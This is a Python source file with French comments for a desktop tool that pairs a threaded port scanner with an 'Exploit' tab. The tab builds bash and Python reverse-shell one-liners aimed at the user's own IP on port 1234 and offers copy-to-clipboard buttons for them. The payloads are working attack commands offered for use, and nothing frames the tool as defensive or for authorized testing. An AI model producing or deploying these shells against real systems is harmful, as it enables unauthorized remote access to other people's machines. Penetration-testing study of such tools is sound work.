import socket
import concurrent.futures
import threading
import customtkinter as ctk
import nmap
import PortScanner



class GUIApp:
    """Classe responsable de l'interface utilisateur."""

    def __init__(self):
        self.scanner = PortScanner.PortScanner()
        self.results = ""  # Stocke les résultats pour l'exportation

        # Configuration de l'application principale
        ctk.set_appearance_mode("dark")
        ctk.set_default_color_theme("blue")
        self.app = ctk.CTk()
        self.app.title("Scanner de Ports")
        self.app.geometry("600x500")

        # Menu déroulant pour changer de fenêtre
        self.menu = ctk.CTkOptionMenu(self.app, values=["Scan", "Exploit"], command=self.switch_tab)
        self.menu.pack(pady=10)

        # Conteneur principal pour les widgets
        self.main_frame = ctk.CTkFrame(self.app)
        self.main_frame.pack(fill="both", expand=True)

        # État de l'onglet actif
        self.current_tab = None

        # Initialisation de l'onglet Scan par défaut
        self.show_scan_tab()

    def show_scan_tab(self):
        """Affiche l'onglet Scan."""
        self.clear_screen()
        self.current_tab = "Scan"

        # Widgets de l'onglet "Scan"
        self.ip_label = ctk.CTkLabel(self.main_frame, text="Entrez l'adresse IP :")
        self.ip_label.pack(pady=10)

        self.ip_entry = ctk.CTkEntry(self.main_frame)
        self.ip_entry.pack(pady=10)

        self.end_port_label = ctk.CTkLabel(self.main_frame, text="Port de fin (par défaut 1024) :")
        self.end_port_label.pack(pady=10)

        self.end_port_entry = ctk.CTkEntry(self.main_frame)
        self.end_port_entry.insert(0, "1024")  # Valeur par défaut
        self.end_port_entry.pack(pady=10)

        self.scan_button = ctk.CTkButton(self.main_frame, text="Lancer le scan", command=self.start_scan)
        self.scan_button.pack(pady=10)

        self.stop_button = ctk.CTkButton(self.main_frame, text="Arrêter le scan", command=self.stop_scan)
        self.stop_button.pack(pady=10)

        self.export_button = ctk.CTkButton(self.main_frame, text="Exporter les résultats", command=self.export_results)
        self.export_button.pack(pady=10)

        self.result_text = ctk.CTkTextbox(self.main_frame, width=400, height=200)
        self.result_text.pack(pady=10)

    def show_exploit_tab(self):
        """Affiche l'onglet Exploit."""
        self.clear_screen()
        self.current_tab = "Exploit"

        # Affichage de l'adresse IP locale
        ip_address = self.get_local_ip()
        self.exploit_label = ctk.CTkLabel(self.main_frame, text=f"Votre adresse IP locale : {ip_address}")
        self.exploit_label.pack(pady=20)

        # Reverse Shell Bash Command
        bash_reverse_shell = f"bash -i >& /dev/tcp/{ip_address}/1234 0>&1"
        self.bash_label = ctk.CTkLabel(self.main_frame, text="Bash Reverse Shell:")
        self.bash_label.pack(pady=5)
        
        self.bash_cmd_label = ctk.CTkLabel(self.main_frame, text=bash_reverse_shell)
        self.bash_cmd_label.pack(pady=5)

        self.bash_copy_button = ctk.CTkButton(self.main_frame, text="Copy to Clipboard", command=lambda: self.copy_to_clipboard(bash_reverse_shell))
        self.bash_copy_button.pack(pady=10)

        # Reverse Shell Python Command
        python_reverse_shell = f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip_address}\",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'"
        self.python_label = ctk.CTkLabel(self.main_frame, text="Python Reverse Shell:")
        self.python_label.pack(pady=5)

        self.python_cmd_label = ctk.CTkLabel(self.main_frame, text=python_reverse_shell)
        self.python_cmd_label.pack(pady=5)
        

        self.python_copy_button = ctk.CTkButton(self.main_frame, text="Copy to Clipboard", command=lambda: self.copy_to_clipboard(python_reverse_shell))
        self.python_copy_button.pack(pady=10)

    def copy_to_clipboard(self, text):
        """Copy the given text to the clipboard."""
        self.app.clipboard_clear()
        self.app.clipboard_append(text)
        self.app.update()  # Update the clipboard


    def clear_screen(self):
        """Efface tous les widgets de l'onglet actuel."""
        for widget in self.main_frame.winfo_children():
            widget.destroy()

    def switch_tab(self, selected_tab):
        """Change d'onglet en fonction de la sélection du menu déroulant."""
        if selected_tab == "Scan":
            self.show_scan_tab()
        elif selected_tab == "Exploit":
            self.show_exploit_tab()

    def get_local_ip(self):
        """Retourne l'adresse IP locale de l'utilisateur."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip_address = s.getsockname()[0]
            s.close()
            return ip_address
        except Exception:
            return "Impossible de déterminer l'adresse IP."

    def start_scan(self):
        """Démarre un scan dans un thread séparé."""
        self.scanner.scanning = True
        ip = self.ip_entry.get()
        start_port = 1  # Port de début fixe
        try:
            end_port = int(self.end_port_entry.get())
        except ValueError:
            self.result_text.insert(ctk.END, "Veuillez entrer un numéro de port valide.\n")
            return

        if end_port < start_port or end_port > 65535:
            self.result_text.insert(ctk.END, "Veuillez entrer une plage de ports valide (1-65535).\n")
            return

        self.result_text.delete(1.0, ctk.END)
        self.result_text.insert(ctk.END, f"Scanning {ip} from port {start_port} to {end_port}...\n")

        threading.Thread(target=self.run_scan, args=(ip, start_port, end_port)).start()

    def run_scan(self, ip, start_port, end_port):
        """Effectue le scan et affiche les résultats."""
        open_ports = self.scanner.scan_ports(ip, start_port, end_port)
        if open_ports:
            self.results = f"Ports ouverts pour {ip} : {', '.join(map(str, open_ports.keys()))}\n"
            self.result_text.insert(ctk.END, self.results)
        else:
            self.results = "Aucun port ouvert trouvé.\n"
            self.result_text.insert(ctk.END, self.results)
        self.scanner.scanning = False

    def stop_scan(self):
        """Arrête le scan en cours."""
        self.scanner.scanning = False
        self.result_text.insert(ctk.END, "Scan arrêté.\n")

    def export_results(self):
        """Exporte les résultats dans un fichier texte."""
        if self.results:
            with open("scan_results.txt", "w") as file:
                file.write(self.results)
            self.result_text.insert(ctk.END, "Résultats exportés dans scan_results.txt\n")
        else:
            self.result_text.insert(ctk.END, "Aucun résultat à exporter.\n")

    def run(self):
        """Lance l'application GUI."""
        self.app.mainloop()


if __name__ == "__main__":
    app = GUIApp()
    app.run()
